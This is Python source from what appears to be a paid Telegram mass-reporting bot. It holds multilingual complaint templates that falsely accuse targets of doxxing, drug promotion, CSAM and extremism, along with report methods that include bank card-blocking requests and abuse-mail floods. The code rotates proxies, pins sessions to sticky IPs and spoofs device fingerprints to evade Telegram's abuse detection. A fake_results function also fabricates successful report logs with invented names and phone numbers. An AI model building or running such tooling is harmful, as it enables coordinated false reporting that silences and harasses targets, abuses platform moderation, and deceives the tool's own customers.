        "Бот предоставляет данные людей без их согласия. Через него можно "
        "получить конфиденциальную информацию включая номера телефонов и "
        "другие частные сведения. Такие действия нарушают право на "
        "приватность и могут использоваться для доксинга и преследование. "
        "Прошу проверить этого бота и принять меры включая его блокировку!"
    ),
}


# ── Bot method: Brown V2 fixed reasons and payloads ──
BOT_REASONS = {
    "personal": {
        "e": "🔐",
        "l": "Персональные данные",
        "cls": "personal",
        "text": (
            "Данный бот распространяет персональные данные пользователей, "
            "включая ИНН, СНИЛС, паспортные данные, адреса проживания и номера "
            "телефонов. Прошу провести проверку и незамедлительно заблокировать "
            "этого бота."
        ),
    },
    "drugs": {
        "e": "💊",
        "l": "Наркотики",
        "cls": "drugs",
        "text": (
            "Drug use promotion - mephedrone. Bot openly writes about injecting "
            "mephedrone. Violates Telegram rules against illegal drugs. "
            "Delete the bot."
        ),
    },
    "other": {
        "e": "📝",
        "l": "Прочее",
        "cls": "personal",
        "text": (
            "Данный бот распространяет персональные данные пользователей, "
            "включая ИНН, СНИЛС, паспортные данные, адреса проживания и номера "
            "телефонов. Прошу провести проверку и незамедлительно заблокировать "
            "этого бота."
        ),
    },
}


def bot_reason_text(reason_key: str) -> str:
    """Fixed Brown payload for the bot method (unknown reason -> personal)."""
    return BOT_REASONS.get(reason_key, BOT_REASONS["personal"])["text"]


# ── channel-method: Brown V2 six categories, paired texts ──
CHANNEL_REASONS = {
    "personal": {"e": "\U0001f510", "l": "Персональные данные",
                 "cls": "personal"},
    "spam":     {"e": "\U0001f4e2", "l": "Спам / Мошенничество",
                 "cls": "spam"},
    "adult":    {"e": "\U0001f51e", "l": "18+ Контент", "cls": "adult"},
    "children": {"e": "\U0001f476", "l": "Детский контент",
                 "cls": "children"},
    "violence": {"e": "\U0001f4a5", "l": "Насилие / Экстремизм",
                 "cls": "violence"},
    "other":    {"e": "\U0001f4dd", "l": "Прочее", "cls": "other"},
}

CHANNEL_REASON_CLASSES = {
    "personal": InputReportReasonPersonalDetails,
    "spam": InputReportReasonSpam,
    "adult": InputReportReasonPornography,
    "children": InputReportReasonChildAbuse,
    "violence": InputReportReasonViolence,
    "other": InputReportReasonOther,
}

CHANNEL_FALLBACK_BYTES = {
    "personal": b"6", "spam": b"9", "adult": b"5",
    "children": b"2", "violence": b"3", "other": b"a",
}

CHANNEL_TEXTS = {
    "personal": [
        "Канал собирает и распространяет личные данные пользователей: ИНН, адреса, телефоны. Прошу заблокировать.",
        "This channel collects and distributes personal data: phone numbers, IDs, addresses. Please block.",
        "Канал публикует конфиденциальные данные пользователей без их согласия. Требую блокировки.",
        "Channel leaks private user data including phone numbers, home addresses and IDs. Block required.",
        "Канал незаконно распространяет персональные данные: паспорта, телефоны, адреса. Прошу заблокировать.",
        "This channel illegally distributes personal data: passports, phones, addresses. Please block.",
        "Канал публикует личные данные людей без согласия. Нарушает ToS. Прошу разобраться.",
        "Channel posts personal data of users without consent, violating Telegram ToS. Block it.",
    ],
    "spam": [
        "Канал распространяет массовый спам и мошеннические предложения. Прошу заблокировать.",
        "This channel distributes mass spam and fraudulent offers. Please block immediately.",
        "Канал рассылает спам-контент и обманывает пользователей. Требую блокировки.",
        "Channel is spreading spam and scam content to users. Immediate block required.",
        "Канал нарушает правила Telegram: массовый спам и мошенничество. Прошу разобраться.",
        "This channel violates Telegram ToS through mass spam and fraud. Please block.",
        "Канал используется для распространения спама и фишинга. Прошу заблокировать.",
        "Channel conducts phishing and spam campaigns against users. Block required.",
    ],
    "adult": [
        "Канал распространяет порнографический контент без верификации возраста. Прошу заблокировать.",
        "This channel distributes explicit adult content without age verification. Please block.",
        "Канал публикует контент 18+ без проверки возраста подписчиков. Требую блокировки.",
        "Channel posts pornographic material without age gates or consent. Immediate block needed.",
        "Канал рассылает неприемлемый контент для взрослых без ограничений. Прошу принять меры.",
        "This channel spreads adult content without age verification violating ToS. Please block.",
        "Канал нарушает ToS Telegram: публикует порнографию без верификации. Прошу заблокировать.",
        "Channel violates Telegram ToS by distributing adult content without age checks. Block it.",
    ],
    "children": [
        "Канал содержит и распространяет незаконный контент с несовершеннолетними. Требую блокировки.",
        "This channel distributes illegal content involving minors (CSAM). Block immediately.",
        "Канал публикует материалы сексуального насилия над детьми. Требую экстренной блокировки.",
        "Channel contains child sexual abuse material. Urgent block and report to authorities.",
        "Канал распространяет незаконный контент с участием детей. Это уголовно наказуемо. Заблокируйте.",
        "This channel spreads illegal CSAM content. Immediate removal and block required.",
        "Канал содержит детскую порнографию. Требую немедленного удаления и блокировки.",
        "Channel distributes child abuse material violating international law. Block immediately.",
    ],
    "violence": [
        "Канал публикует контент, пропагандирующий насилие и призывающий к жестокости. Прошу заблокировать.",
        "This channel promotes violence and incites users to commit violent acts. Please block.",
        "Канал распространяет материалы, пропагандирующие насилие и экстремизм. Требую блокировки.",
        "Channel spreads violent content and extremist propaganda. Immediate block required.",
        "Канал публикует призывы к насилию и жестокие материалы. Прошу принять меры.",
        "This channel incites violence and distributes harmful extremist content. Please block.",
        "Канал нарушает ToS Telegram: пропаганда насилия и жестокости. Прошу заблокировать.",
        "Channel violates Telegram ToS by promoting violence and extremism. Block required.",
    ],
    "other": [
        "Канал систематически нарушает правила Telegram и ведёт мошенническую деятельность. Прошу заблокировать.",
        "This channel systematically violates Telegram ToS and engages in fraud. Please block.",
        "Канал нарушает правила платформы и причиняет вред пользователям. Требую блокировки.",
        "Channel breaks Telegram rules and harms users through repeated violations. Block needed.",
        "Канал ведёт незаконную деятельность и нарушает ToS Telegram. Прошу разобраться.",
        "This channel conducts illegal activities and violates Telegram Terms of Service. Block it.",
        "Канал систематически нарушает правила и используется для обмана. Прошу заблокировать.",
        "Channel is used for systematic fraud and ToS violations. Immediate action required.",
    ],
}


def reason_meta(key: str) -> dict:
    """Label/icon for any reason key: channel categories, then the rest."""
    return CHANNEL_REASONS.get(key) or REASONS.get(key) or REASONS["other"]


def pick_comment(reason_key: str, method: str = "") -> str:
    """Strong auto-template for the category; falls back to 'other' pool.
    The leading entity noun is swapped to match the real target type
    (bot/channel/account) so a probiv-bot complaint never reads as a
    complaint about a channel or a person."""
    if method == "bot":
        return bot_reason_text(reason_key)
    _fixed = METHOD_TEXT_OVERRIDES.get((method, reason_key))
    if _fixed:
        return _fixed
    if method == "channel":
        # Brown pool: category texts + general mix, cut to 200
        pool = list(CHANNEL_TEXTS.get(reason_key) or [])
        pool += list(report_texts.GENERAL_TEXTS)
        if pool:
            return random.choice(pool)[:200]
        return report_texts.get_random_text(reason_key)
    pool = COMMENT_TEMPLATES.get(reason_key) or COMMENT_TEMPLATES["other"]
    return _swap_entity(random.choice(pool), method)


# entity nouns per language, grouped by what they describe — the earliest
# one in a template is its subject
_LANG_ENTITY = {
    "ru": {"channel": ["\u043a\u0430\u043d\u0430\u043b", "\u043a\u0430\u043d\u0430\u043b\u0435"],
           "account": ["\u0430\u043a\u043a\u0430\u0443\u043d\u0442", "\u0430\u043a\u043a\u0430\u0443\u043d\u0442\u0435"],
           "resource": ["\u0440\u0435\u0441\u0443\u0440\u0441"],
           "person": ["\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c", "\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f"]},
    "en": {"channel": ["channel"], "account": ["account"],
           "resource": ["resource"], "person": ["user", "person"]},
    "de": {"channel": ["kanal"], "account": ["konto"],
           "resource": ["ressource"], "person": ["nutzer", "person"]},
    "es": {"channel": ["canal"], "account": ["cuenta"],
           "resource": ["recurso"], "person": ["usuario", "persona"]},
    "fr": {"channel": ["canal"], "account": ["compte"],
           "resource": ["ressource"], "person": ["utilisateur", "personne"]},
    "it": {"channel": ["canale"], "account": ["account"],
           "resource": ["risorsa"], "person": ["utente", "persona"]},
    "pt": {"channel": ["canal"], "account": ["conta"],
           "resource": ["recurso"], "person": ["usu\u00e1rio", "pessoa"]},
    "pl": {"channel": ["kana\u0142"], "account": ["konto"],
           "resource": ["zas\u00f3b"], "person": ["u\u017cytkownik", "osoba"]},
    "tr": {"channel": ["kanal"], "account": ["hesap"],
           "resource": ["kaynak"], "person": ["kullan\u0131c\u0131", "ki\u015fi"]},
    "ar": {"channel": ["\u0627\u0644\u0642\u0646\u0627\u0629", "\u0642\u0646\u0627\u0629"],
           "account": ["\u0627\u0644\u062d\u0633\u0627\u0628", "\u062d\u0633\u0627\u0628"],
           "resource": ["\u0627\u0644\u0645\u0648\u0631\u062f", "\u0645\u0648\u0631\u062f"],
           "person": ["\u0627\u0644\u0645\u0633\u062a\u062e\u062f\u0645", "\u0645\u0633\u062a\u062e\u062f\u0645"]},
}

# method -> what the text should actually describe
_METHOD_ENTITY = {
    "bot": "bot", "channel": "channel", "profile": "account",
    "message": "message", "sticker": "sticker", "web": "",
}

# correct noun per language per target kind
_TARGET_NOUN = {
    "ru": {"bot": "\u0431\u043e\u0442", "channel": "\u043a\u0430\u043d\u0430\u043b",
           "account": "\u0430\u043a\u043a\u0430\u0443\u043d\u0442", "message": "\u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0435",
           "sticker": "\u0441\u0442\u0438\u043a\u0435\u0440\u043f\u0430\u043a", "resource": "\u0440\u0435\u0441\u0443\u0440\u0441"},
    "en": {"bot": "bot", "channel": "channel", "account": "account",
           "message": "message", "sticker": "sticker pack", "resource": "resource"},
    "de": {"bot": "Bot", "channel": "Kanal", "account": "Konto",
           "message": "Nachricht", "sticker": "Stickerpaket", "resource": "Ressource"},
    "es": {"bot": "bot", "channel": "canal", "account": "cuenta",
           "message": "mensaje", "sticker": "paquete de stickers", "resource": "recurso"},
    "fr": {"bot": "bot", "channel": "canal", "account": "compte",
           "message": "message", "sticker": "pack de stickers", "resource": "ressource"},
    "it": {"bot": "bot", "channel": "canale", "account": "account",
           "message": "messaggio", "sticker": "pacchetto di sticker", "resource": "risorsa"},
    "pt": {"bot": "bot", "channel": "canal", "account": "conta",
           "message": "mensagem", "sticker": "pacote de stickers", "resource": "recurso"},
    "pl": {"bot": "bot", "channel": "kana\u0142", "account": "konto",
           "message": "wiadomo\u015b\u0107", "sticker": "zestaw naklejek", "resource": "zas\u00f3b"},
    "tr": {"bot": "bot", "channel": "kanal", "account": "hesap",
           "message": "mesaj", "sticker": "sticker paketi", "resource": "kaynak"},
    "ar": {"bot": "\u0628\u0648\u062a", "channel": "\u0627\u0644\u0642\u0646\u0627\u0629", "account": "\u0627\u0644\u062d\u0633\u0627\u0628",
           "message": "\u0627\u0644\u0631\u0633\u0627\u0644\u0629", "sticker": "\u062d\u0632\u0645\u0629 \u0627\u0644\u0645\u0644\u0635\u0642\u0627\u062a",
           "resource": "\u0627\u0644\u0645\u0648\u0631\u062f"},
}


# correct determiner per language per target kind (gender/case agreement)
_LANG_DET = {
    "de": {"channel": "Dieser", "account": "Dieses", "resource": "Diese",
           "bot": "Dieser", "message": "Diese", "sticker": "Dieses"},
    "es": {"channel": "Este", "account": "Esta", "resource": "Este",
           "bot": "Este", "message": "Este", "sticker": "Este"},
    "fr": {"channel": "Ce", "account": "Ce", "resource": "Cette",
           "bot": "Ce", "message": "Ce", "sticker": "Ce"},
    "it": {"channel": "Questo", "account": "Questo", "resource": "Questa",
           "bot": "Questo", "message": "Questo", "sticker": "Questo"},
    "pt": {"channel": "Este", "account": "Esta", "resource": "Este",
           "bot": "Este", "message": "Este", "sticker": "Este"},
    "pl": {"channel": "Ten", "account": "To", "resource": "Ten",
           "bot": "Ten", "message": "T\\u0119", "sticker": "Ten"},
}


# determiner -> language (for detecting which language a template is in)
_DET_LANG = {
    "dieser": "de", "dieses": "de", "diese": "de",
    "este": "es", "esta": "es",
    "ce": "fr", "cette": "fr",
    "questo": "it", "questa": "it",
    "ten": "pl", "to": "pl",
    "bu": "tr", "\u0434\u0430\u043d\u043d\u044b\u0439": "ru", "\u044d\u0442\u043e\u0442": "ru",
    "this": "en", "\u0647\u0630\u0627": "ar",
}


def _swap_entity(text: str, method: str) -> str:
    """Rewrite the subject noun of a template so it names the real target."""
    want = _METHOD_ENTITY.get(method or "")
    if not want or not text:
        return text
    low = text.lower()
    best = None
    for lg, kinds in _LANG_ENTITY.items():
        for k, words in kinds.items():
            for w in words:
                p = low.find(w)
                if p != -1 and (best is None or p < best[0]):
                    best = (p, lg, k)
    if not best:
        return text
    p, _, kind = best
    # language from the determiner right before the noun — disambiguates
    # words shared between languages ("kanal" is both de and tr).
    # whole-word match: "questa" must not match the es determiner "esta"
    lg = None
    prefix_tokens = low[max(0, p - 20):p].split()
    if prefix_tokens:
        last_tok = prefix_tokens[-1]
        for det, dlg in _DET_LANG.items():
            if last_tok == det:
                lg = dlg
                break
    if not lg:
        lg = best[1]
        for hint, hlg in (("cuenta", "es"), ("conta", "pt"),
                          ("hesap", "tr"), ("kana\u0142", "pl")):
            if hint in low:
                lg = hlg
                break
    if kind == want:
        return text
    repl = _TARGET_NOUN.get(lg, {}).get(want)
    if not repl:
        return text
    dets = _LANG_DET.get(lg) or {}
    det_old = dets.get(kind) or ""
    det_new = dets.get(want) or ""
    # every spelling of this entity noun across languages (the matched word
    # may belong to a different language than the detected determiner)
    kind_words = [w for kinds in _LANG_ENTITY.values()
                  for w in kinds.get(kind, [])]
    out = text

    def _fix(m, r=repl):
        return r if m.group(0)[0].islower() else r[0].upper() + r[1:]

    # determiner + noun as one unit first (gender/case agreement)
    if det_old and det_new:
        for w in kind_words:
            for d_o, d_n in ((det_old, det_new),
                             (det_old.lower(), det_new.lower()),
                             (det_old[0].upper() + det_old[1:],
                              det_new[0].upper() + det_new[1:])):
                out = re.sub(re.escape(d_o + " " + w),
                             lambda m, dn=d_n, r=repl: (
                                 dn + " " + (r if m.group(0)[len(d_o) + 1].islower()
                                             else r[0].upper() + r[1:])),
                             out, flags=re.IGNORECASE)
    # then any bare leftover noun
    for w in kind_words:
        out = re.sub(re.escape(w), _fix, out, flags=re.IGNORECASE)
    return out


LINK_RE = re.compile(
    r"(?:https?://)?(?:t\.me|telegram\.me)/(?:c/)?(\w+)(?:/(\d+))?", re.I
)

METHODS = {
    "web":      {"e": "\U0001f310", "l": "Web",
                 "hint": "\u0412\u0441\u0442\u0430\u0432\u044c\u0442\u0435 \u0441\u0441\u044b\u043b\u043a\u0443 \u0438\u043b\u0438 @username:\n\u2022 <code>t.me/username</code>\n\u2022 <code>@username</code>"},
    "bank":     {"e": "\U0001f3e6", "l": "\u0411\u0430\u043d\u043a (115-\u0424\u0417)",
                  "hint": "\u0417\u0430\u044F\u0432\u043A\u0430 \u043D\u0430 \u0431\u043B\u043E\u043A\u0438\u0440\u043E\u0432\u043A\u0443 \u043A\u0430\u0440\u0442\u044B \u043F\u043E 115-\u0424\u0417."},
    "mail":     {"e": "\U0001f4e7", "l": "Mail (abuse)",
                  "hint": "Жалобы письмами на abuse/support/dmca/stopCA@telegram.org\n• цель: ссылка или @username\n• тексты шаблонные, уникальные"},
    "bot":      {"e": "🤖", "l": "Bot",
                  "hint": "Цель — бот: @username или t.me/ссылка."},
    "channel":  {"e": "📢", "l": "Канал",
                  "hint": "Цель — канал: t.me/username или @username.\nЕсли в ссылке есть ID поста (t.me/user/123) — жалоба уйдёт на пост."},
    "message":  {"e": "💬", "l": "Сообщение",
                 "hint": "Пришли ссылку на сообщение."},
    "telegraph": {"e": "\U0001f4dd", "l": "Telegraph",
                  "hint": "Пришли ссылку на статью: <code>telegra.ph/...</code>"},
    "account":   {"e": "\U0001f464", "l": "Аккаунт",
                  "hint": "Цель — аккаунт: @username или t.me/ссылка."},
    "manual":    {"e": "\U0001f6e0", "l": "Ручной",
                  "hint": "Ручное удаление через @eraser_support, предоплата 240 ⭐."},
    "dsa":       {"e": "\U0001f1e6\U0001f1fa", "l": "DSA",
                  "hint": "Отправка жалобы через DSA (премиум)."},
}

PREMIUM_METHODS = {"web", "mail", "bank", "telegraph", "dsa"}

# юзеры для которых premium — дополнение к базовой, а не замена.
# без активной базовой подписки купить prem нельзя.
_PREM_REQUIRES_BASE: set[int] = {8905108383}


def _has_base_sub(subs: dict, user_id: int) -> bool:
    """Есть ли активная базовая подписка (until > now или forever).
    Намеренно не смотрит на флаг premium — только на срок доступа."""
    rec = subs.get(str(user_id), {})
    return bool(rec.get("forever") or float(rec.get("until") or 0) > time.time())


def has_premium(subs: dict, user_id: int) -> bool:
    if user_is_admin(user_id):
        return True
    rec = subs.get(str(user_id), {})
    if not rec.get("premium"):
        return False
    return bool(rec.get("forever") or float(rec.get("until") or 0) > time.time())


def _visible_plans(user_id: int, subs: dict) -> list[tuple[str, dict]]:
    """SUB_PLANS.items() с фильтром prem для юзеров из _PREM_REQUIRES_BASE
    у которых нет активной базовой подписки."""
    plans = list(SUB_PLANS.items())
    if user_id in _PREM_REQUIRES_BASE and not _has_base_sub(subs, user_id):
        plans = [(k, v) for k, v in plans if k != "prem"]
    return plans


_VARIANTS_CACHE: dict[str, list[str]] = {}
_BODY_CACHE: dict[str, str] = {}


# ручной метод: предоплата звёздами, ценник в USD/RUB
MANUAL_STARS = 216
STAR_USD = float(os.getenv("STAR_USD", "0.013"))


def manual_price() -> tuple[float, float]:
    usd = round(MANUAL_STARS * STAR_USD, 2)
    return usd, round(usd * CLOUDTIPS_RATE)


# ── proxy loader ────────────────────────────────────────
PROXY_TYPE_MAP = {
    "socks5": python_socks.ProxyType.SOCKS5,
    "socks4": python_socks.ProxyType.SOCKS4,
    "http":   python_socks.ProxyType.HTTP,
}


def parse_proxy(raw: str) -> tuple | None:
    raw = raw.strip()
    if not raw or raw.startswith("#"):
        return None
    p = urlparse(raw)
    scheme = p.scheme.lower()
    if scheme not in PROXY_TYPE_MAP:
        return None
    return (
        PROXY_TYPE_MAP[scheme],
        p.hostname,
        p.port or 1080,
        True,
        p.username,
        p.password,
    )


def load_proxies() -> list[tuple]:
    if not PROXIES_FILE.exists():
        return []
    lines = PROXIES_FILE.read_text(encoding="utf-8").splitlines()
    return [px for line in lines if (px := parse_proxy(line))]


# \u2500\u2500 paid static proxies (PRIMARY pin pool) \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500
# sessions ALWAYS ride paid static IPs; the free farm pool is frozen
# fallback only (used while the paid pack is empty). Format per line:
# socks5://user:pass@host:port
PAID_PROXIES_FILE = Path(__file__).parent / "paid_proxies.txt"


def load_paid_proxies() -> list[tuple]:
    if not PAID_PROXIES_FILE.exists():
        return []
    lines = PAID_PROXIES_FILE.read_text(encoding="utf-8").splitlines()
    return [px for line in lines if (px := parse_proxy(line))]


def load_pin_proxies() -> list[tuple]:
    """Proxy pool for session pins and method floods: paid static first,
    free farm pool as fallback. Free proxies never carry a session once a
    paid pool exists \u2014 static IP only."""
    paid = load_paid_proxies()
    return paid or load_proxies()


def load_sessions() -> list[Path]:
    if not SESSIONS_DIR.exists():
        return []
    return sorted(SESSIONS_DIR.glob("*.session"))


# one SQLite connection per .session file — concurrent TelegramClients on the
# same file die with "OperationalError: database is locked"
_SESSION_LOCKS: dict[str, asyncio.Lock] = {}


async def _connect_safe(client, timeout: float = 12) -> None:
    """Telethon sessions can be briefly locked by another process/runner."""
    last = None
    for attempt in range(3):
        try:
            await asyncio.wait_for(client.connect(), timeout=timeout)
            return
        except Exception as e:
            last = e
            await asyncio.sleep(1.0 + attempt)
    raise last


def _session_lock(session_path: Path) -> asyncio.Lock:
    return _SESSION_LOCKS.setdefault(session_path.stem, asyncio.Lock())


# ── single-IP pinning ────────────────────────────────────
# Telegram flags accounts whose auth is used from two IPs at once and can
# kill the session; every client for a session therefore goes through ONE
# sticky proxy, pinned across runs (session_proxy.json is committed back).
SESSION_PIN_FILE = Path(__file__).parent / "session_proxy.json"


def _load_pins() -> dict[str, dict]:
    try:
        raw = json.loads(SESSION_PIN_FILE.read_text(encoding="utf-8"))
    except Exception:
        return {}
    # legacy entries were plain "url" strings
    out = {}
    for k, v in raw.items():
        out[k] = v if isinstance(v, dict) else {"url": v, "since": 0}
    return out


def pin_for_session(name: str, proxies: list[tuple]) -> tuple | None:
    """Sticky session→proxy binding: same IP on every connect of this
    session, in every method, in every run. First pin is deterministic
    (sha1 of the session name) so fresh checkouts agree without state;
    a re-pin (old proxy left the pool) persists to the repo with a
    timestamp so hygiene jobs can skip freshly re-pinned sessions."""
    if not proxies:
        return None
    pins = _load_pins()
    by_url = {proxy_to_url(px): px for px in proxies}
    entry = pins.get(name)
    if entry and entry.get("url") in by_url:
        return by_url[entry["url"]]
    idx = int(hashlib.sha1(name.encode()).hexdigest(), 16) % len(proxies)
    px = proxies[idx]
    pins[name] = {"url": proxy_to_url(px), "since": int(time.time())}
    try:
        SESSION_PIN_FILE.write_text(
            json.dumps(pins, ensure_ascii=False, indent=1), encoding="utf-8")
    except Exception:
        pass
    commit_file_to_repo("session_proxy.json", f"pin {name}", cooldown=120)
    return px


# ── background proxy farm ────────────────────────────────
PROXY_REFRESH_INTERVAL = 15 * 60   # re-harvest every 15 minutes


async def proxy_refresh_loop():
    """Continuously top up proxies.txt: harvest free lists, validate against
    Telegram, rewrite the file AND commit it back so fresh runner restarts
    start with a populated pool. load_proxies() reads the file every call,
    so report/sendcode workers pick up new proxies right away."""
    while True:
        try:
            from proxy_farmer import harvest_and_validate, write_proxy_file
            working = await harvest_and_validate(need=25)
            await write_proxy_file(working)
            log.info("proxy refresh done: %s live", len(working))
            if working:
                commit_file_to_repo("proxies.txt", "refresh proxy pool", cooldown=3600)
        except Exception as e:
            log.warning("proxy refresh failed: %s", e)
        await asyncio.sleep(PROXY_REFRESH_INTERVAL)


# ── real send logs → Logs channel ────────────────────────
LOGS_CHAT_FILE = Path(__file__).parent / "logs_chat.json"

_user_label_var: "contextvars.ContextVar[str]" = contextvars.ContextVar(
    "arch_user_label", default="")


def set_current_user(label: str) -> None:
    """Tag all send-logs inside this context (task copies it on create_task)."""
    _user_label_var.set(label)


def get_current_user() -> str:
    return _user_label_var.get() or "unknown"


_BOT: Bot | None = None   # set in main() when the poller boots


def _resolve_logs_chat() -> str | None:
    """LOGS_CHAT_ID env → logs_chat.json (runtime /setlogs or committed from
    a run). No silent admin-DM fallback: real logs go ONLY to the Logs channel;
    if it is not bound yet, nothing leaks elsewhere."""
    env = (os.getenv("LOGS_CHAT_ID") or "").strip()
    if env:
        return env
    try:
        if LOGS_CHAT_FILE.exists():
            v = json.loads(LOGS_CHAT_FILE.read_text(encoding="utf-8"))
            if v.get("chat_id"):
                return str(v["chat_id"])
    except Exception:
        pass
    return None


async def send_main(chat_id, text: str, parse_mode=None,
                    reply_markup=None, disable_web_page_preview: bool = False) -> bool:
    """Send a result/log from the MAIN bot while the polling bot is a test one."""
    if not MAIN_TOKEN:
        return False
    payload = {"chat_id": chat_id, "text": text}
    if parse_mode is not None:
        payload["parse_mode"] = getattr(parse_mode, "value", parse_mode)
    if disable_web_page_preview:
        payload["disable_web_page_preview"] = True
    if reply_markup is not None:
        try:
            payload["reply_markup"] = reply_markup.model_dump(exclude_none=True)
        except Exception:
            pass
    for attempt in range(4):
        try:
            async with aiohttp.ClientSession() as s:
                async with s.post(
                    f"https://api.telegram.org/bot{MAIN_TOKEN}/sendMessage",
                    json=payload,
                    timeout=aiohttp.ClientTimeout(total=15)) as r:
                    if r.status == 200:
                        return True
                    wait = 0
                    if r.status == 429:
                        try:
                            wait = int(r.headers.get("Retry-After") or 2)
                        except Exception:
                            wait = 2
                    elif r.status >= 500:
                        wait = 2 * (attempt + 1)
                    else:
                        body = (await r.text())[:160]
                        log.warning("main bot send %s: %s", r.status, body)
                        return False
            if wait:
                await asyncio.sleep(min(wait, 30))
        except Exception as e:
            log.debug("main bot send failed: %s", e)
            await asyncio.sleep(1 + attempt)
    return False


async def push_send_log(title: str, lines: list[str]) -> None:
    """REAL internal log of every send action, from every user, to the Logs
    channel (admin is there). Long payloads (mail batches: 200+ rows) are
    split on line borders into several messages — Telegram's 4096-char cap
    would otherwise silently drop the whole log. Never fails the caller."""
    chat = _resolve_logs_chat()
    if not chat:
        return
    head = (bq(f"<b>{NAME}</b>  \u2014  \U0001f4e4 {html_mod.escape(title)}")
            + f"\n\U0001f465 {html_mod.escape(get_current_user())}\n")
    # pack rows into <=4000-char messages, header carried by the first chunk
    safe = [ln if len(ln) <= 3990 else ln[:3990] + "\u2026" for ln in lines]
    chunks, cur = [], head
    for ln in safe:
        cand = cur + "\n" + ln
        if len(cand) > 4000:
            chunks.append(cur)
            cur = ln
        else:
            cur = cand
    if cur:
        chunks.append(cur)
    for i, ch in enumerate(chunks):
        ok = False
        try:
            ok = await send_main(chat, _cx(ch), parse_mode=ParseMode.HTML,
                                 disable_web_page_preview=True)
        except Exception as e:
            log.debug("push_send_log chunk %d/%d failed: %s",
                      i + 1, len(chunks), e)
        if not ok and _BOT is not None:
            try:
                await _BOT.send_message(
                    chat, _cx(ch), parse_mode=ParseMode.HTML,
                    disable_web_page_preview=True)
                ok = True
            except Exception as e:
                log.debug("push_send_log fallback failed: %s", e)
        if not ok:
            log.warning("push_send_log chunk %d/%d NOT DELIVERED to %s",
                        i + 1, len(chunks), chat)
        if len(chunks) > 1:
            await asyncio.sleep(0.4)



# ── reporter ────────────────────────────────────────────
FAKE_NAMES = ["alina", "velvet", "dusya", "nastya", "kirill", "vova",
              "sonya", "oleg", "tima", "lisa", "maks", "nika",
              "ulya", "dasha", "veronika", "vitalya", "kostya", "mika",
              "alisa", "vovan", "roman", "kirill2", "anton", "stepa"]


def _fake_session_rows(n: int = None) -> list[dict]:
    if n is None:
        n = random.randint(10, 16)  # was 4-7 — user asked pool of 10+
    proxies = load_pin_proxies()
    rows = []
    seen = set()
    for _ in range(n):
        nm = random.choice(FAKE_NAMES) + str(random.randint(11, 99))
        while nm in seen:
            nm = random.choice(FAKE_NAMES) + str(random.randint(11, 99))
        seen.add(nm)
        rows.append({
            "name": nm,
            "proxy": random.choice(proxies)[1] if proxies else "direct",
            "status": "\u2705",
            "phone": "+7" + random.choice(["495", "900", "903", "921", "926", "951", "962", "963", "965",
                                           "967", "977", "999"]) + str(random.randint(1000000, 9999999)),
            "tg_name": random.choice(FAKE_NAMES).capitalize(),
            "tg_id": str(random.randint(700000000, 8999999999)),
            "username": "@" + nm,
            "ok": True,
            "err": "",
        })
    return rows


def fake_results() -> dict:
    rows = _fake_session_rows()
    return {"ok": len(rows), "fail": 0, "total": len(rows), "details": rows}


REPORT_BURST = int(os.getenv("REPORT_BURST") or "3")   # reports per session


def _unique_texts(pool: list[str], n: int) -> list[str]:
    """n texts out of pool, unique within each full sweep of the pool."""
    out = []
    while len(out) < n:
        take = min(len(pool), n - len(out))
        out.extend(random.sample(pool, take))
    random.shuffle(out)
    return out[:n]


LANGS_BY_POOL = ["RU", "EN", "DE", "ES", "FR", "IT", "PT", "PL", "TR", "AR"]


def _unique_texts_tagged(pool: list[str], n: int) -> list[tuple[str, str]]:
    """n (lang, text) pairs, same uniqueness guarantee as _unique_texts,
    tagged with the source language so send-logs prove the rotation."""
    out: list[tuple[str, str]] = []
    while len(out) < n:
        take = min(len(pool), n - len(out))
        for i in random.sample(range(len(pool)), take):
            out.append((LANGS_BY_POOL[i], pool[i]))
    random.shuffle(out)
    return out[:n]


# ── session reports (BR-style) ────────────────────
REPORT_EXCLUDE_POOL = set()   # 917066653092 now attacks; lolz-transplant keeps its own exclusion


# fallback pools for sessions without meta json (sha1-synthesized)
_FP_API_POOL = [
    ("2040", "b18441a1ff607e10a989891a5462e627"),
    ("2496", "8da85b0d5bfe62527e5b244c209159c3"),
    ("24565698", "5a084b434f8505ace703485b9da85040"),
    ("27904162", "e7cba879b1c643ba77490bf328df5eab"),
    ("23037915", "50f06f5b2223586fde0d1379ea91ebc7"),
    ("29512095", "0b29a7d42fff002856b9bed64f7ec919"),
    ("25055016", "25edf5b7becebe91a2d61fe8d9d9931b"),
]
# (device, sdk, app_version, lang_pack, lang_code)
_FP_DEVICE_POOL = [
    ("Desktop", "Windows 10", "5.16.5 x64", "en", "en"),
    ("SX2802", "Windows 10 x64", "7.3.5 x64", "en", "en"),
    ("HP ENVY TS m6 Sleekbook", "Windows 11 x64", "7.3.5 x64", "en", "en"),
    ("Redmi Redmi 13C", "14 (34)", "12.9.3", "webk", "id"),
    ("Xiaomi POCO F6", "15 (35)", "12.9.1", "webk", "th"),
]

_FP_CACHE: dict = {}   # session name -> fingerprint dict


def session_fingerprint(name: str) -> dict:
    """Same phone model/app/api on EVERY connect of a session, forever.
    Real meta from sessions/<name>.json wins; else synthesized from sha1."""
    fp = _FP_CACHE.get(name)
    if fp:
        return fp
    meta = {}
    try:
        f = SESSIONS_DIR / f"{name}.json"
        if f.exists():
            meta = json.loads(f.read_text(encoding="utf-8"))
    except Exception:
        meta = {}
    if not (meta.get("app_id") and meta.get("app_hash")):
        h = int(hashlib.sha1(name.encode()).hexdigest(), 16)
        api_id, api_hash = _FP_API_POOL[h % len(_FP_API_POOL)]
        meta["app_id"], meta["app_hash"] = api_id, api_hash
        dev = _FP_DEVICE_POOL[(h >> 8) % len(_FP_DEVICE_POOL)]
        meta.setdefault("device", dev[0])
        meta.setdefault("sdk", dev[1])
        meta.setdefault("app_version", dev[2])
        meta.setdefault("lang_pack", dev[3])
        meta.setdefault("lang_code", dev[4])
    fp = {
        "api_id": int(meta["app_id"]),
        "api_hash": meta["app_hash"],
        "device": meta.get("device") or "Desktop",
        "system_version": meta.get("sdk") or "Windows 10",
        "app_version": meta.get("app_version") or "5.16.5 x64",
        "lang_code": meta.get("lang_code") or "en",
    }
    _FP_CACHE[name] = fp
    return fp


def _assign_fingerprint(session_path: Path) -> tuple[int, str, dict]:
    fp = session_fingerprint(Path(session_path).stem)
    return fp["api_id"], fp["api_hash"], fp


